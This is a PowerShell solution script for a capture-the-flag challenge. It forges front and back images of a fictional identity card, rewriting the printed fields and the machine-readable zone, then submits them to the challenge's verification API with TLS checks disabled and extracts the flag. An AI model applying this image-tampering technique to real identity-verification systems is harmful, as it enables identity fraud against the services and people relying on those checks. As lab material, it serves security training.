# Script de resolución para Capturando al Ladrón (HackLab / SoftwareSeguro)
# Genera las imágenes con los datos exactos del titular y envía la petición multipart a la API.

Add-Type -AssemblyName System.Drawing

$ErrorActionPreference = "Stop"

$PSScriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$frenteOrig = Join-Path $PSScriptRoot "cim-frente.png"
$dorsoOrig = Join-Path $PSScriptRoot "cim-dorso.png"
$frenteFinal = Join-Path $PSScriptRoot "frente_final.jpg"
$dorsoFinal = Join-Path $PSScriptRoot "dorso_final.jpg"

Write-Host "[*] Generando imágenes adulteradas de la Credencial de Identidad Marciana..." -ForegroundColor Cyan

# 1. Modificar Frente
$frente = [System.Drawing.Bitmap]::FromFile($frenteOrig)
$g1 = [System.Drawing.Graphics]::FromImage($frente)
$g1.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::AntiAliasGridFit

$brushText = [System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(20, 20, 20))
$fontValue = [System.Drawing.Font]::new("Arial", 11.5, [System.Drawing.FontStyle]::Bold)

function ReplaceFrenteField($x, $y, $w, $h, $newText) {
    $bgCol = $frente.GetPixel($x - 5, $y + [int]($h / 2))
    $brushBg = [System.Drawing.SolidBrush]::new($bgCol)
    $g1.FillRectangle($brushBg, $x, $y, $w, $h)
    $g1.DrawString($newText, $fontValue, $brushText, $x, $y - 2)
}

ReplaceFrenteField 191 106 250 20 "VENKRA DOSS"
ReplaceFrenteField 191 154 250 20 "KAIRA LOM"
ReplaceFrenteField 191 200 40 20 "F"
ReplaceFrenteField 191 246 200 20 "MRC-48217390"
ReplaceFrenteField 191 292 180 20 "14/03/0219"
ReplaceFrenteField 191 338 180 20 "14/03/0241"

$g1.Dispose()
$frente.Save($frenteFinal, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$frente.Dispose()

# 2. Modificar Dorso (Zona MRZ)
$dorso = [System.Drawing.Bitmap]::FromFile($dorsoOrig)
$g2 = [System.Drawing.Graphics]::FromImage($dorso)
$g2.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::AntiAliasGridFit

$fontMrz = [System.Drawing.Font]::new("Consolas", 12, [System.Drawing.FontStyle]::Bold)

$bgCol = $dorso.GetPixel(15, 340)
$brushBg = [System.Drawing.SolidBrush]::new($bgCol)
$g2.FillRectangle($brushBg, 20, 320, 500, 80)

$l1 = "IDMRCMRC48217390<<<<<<<<<<<<<<<"
$l2 = "0219030F0241030MRC<<<<<<<<<<<<<0"
$l3 = "VENKRA<DOSS<<KAIRA<LOM<<<<<<<<<"

for ($i = 0; $i -lt $l1.Length; $i++) {
    $g2.DrawString($l1[$i].ToString(), $fontMrz, $brushText, [float](24 + $i * 11.8), 327)
}
for ($i = 0; $i -lt $l2.Length; $i++) {
    $g2.DrawString($l2[$i].ToString(), $fontMrz, $brushText, [float](24 + $i * 11.8), 352)
}
for ($i = 0; $i -lt $l3.Length; $i++) {
    $g2.DrawString($l3[$i].ToString(), $fontMrz, $brushText, [float](24 + $i * 11.8), 377)
}

$g2.Dispose()
$dorso.Save($dorsoFinal, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$dorso.Dispose()

Write-Host "[*] Enviando petición a la API..." -ForegroundColor Cyan

$url = "https://auth.shared.softwareseguro.com.ar/api/verificar"
$res = & curl.exe -s -k -X POST $url `
  -F "apellido=VENKRA DOSS" `
  -F "nombre=KAIRA LOM" `
  -F "matricula=MRC-48217390" `
  -F "sexo=F" `
  -F "fecha_nacimiento=14/03/0219" `
  -F "foto_frente=@$frenteFinal;type=image/jpeg;filename=frente.jpg" `
  -F "foto_dorso=@$dorsoFinal;type=image/jpeg;filename=dorso.jpg"

Write-Host "[*] Respuesta de la API: $res" -ForegroundColor Green

$json = $res | ConvertFrom-Json
if ($json.verificado) {
    $certUrl = "https://auth.shared.softwareseguro.com.ar" + $json.certificado_url
    Write-Host "`n[+] Certificado emitido: $certUrl" -ForegroundColor Yellow
    $certHtml = & curl.exe -s -k $certUrl
    if ($certHtml -match '<div class="flag">([^<]+)</div>') {
        Write-Host "`n==========================================" -ForegroundColor Green
        Write-Host "FLAG: $($matches[1])" -ForegroundColor Green
        Write-Host "==========================================" -ForegroundColor Green
    }
}
